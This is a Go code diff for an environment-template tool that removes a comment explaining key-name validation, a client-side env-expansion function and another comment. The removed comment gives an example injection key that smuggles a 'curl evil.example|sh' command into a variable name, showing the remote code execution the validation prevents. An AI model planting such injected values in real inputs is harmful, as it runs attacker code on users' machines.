@@ -6,10 +6,6 @@ import (
 	"strings"
 )
 
-// IsValidKey reports whether s matches ^[A-Za-z_][A-Za-z0-9_]*$.
-// Both the parser and tplenv's shell-output path reject anything else:
-// a key like "EVIL;curl evil.example|sh;X" otherwise becomes RCE under
-// `eval "$(tplenv … env)"`.
 func IsValidKey(s string) bool {
 	if s == "" {
 		return false
@@ -32,27 +28,6 @@ func IsValidKey(s string) bool {
 	return true
 }
 
-// ExpandClientEnv applies os.ExpandEnv to each value in m using the
-// caller's (i.e. the client process's) environment. This is the
-// counterpart to the daemon's deliberate refusal to do server-side
-// env expansion: doing it on the client side means $USERNAME, $HOME,
-// $USERPROFILE, etc. resolve to the user's values, not the daemon's.
-// Provider-resolved secrets are also passed through ExpandEnv — if a
-// secret happens to contain "$something" the client will try to
-// expand it. The realistic blast radius is small (it expands against
-// the same env the caller already has) but callers that need raw
-// secret pass-through should avoid templates that mix the two.
-func ExpandClientEnv(m map[string]string) map[string]string {
-	out := make(map[string]string, len(m))
-	for k, v := range m {
-		out[k] = os.ExpandEnv(v)
-	}
-	return out
-}
-
-// ExpandClientEnvBytes is the same idea for raw "KEY=VALUE" lines.
-// Lines that are comments, blank, or don't contain '=' are emitted
-// verbatim. Only the value portion is expanded.
 func ExpandClientEnvBytes(b []byte) []byte {
 	scanner := bufio.NewScanner(strings.NewReader(string(b)))
 	var out strings.Builder
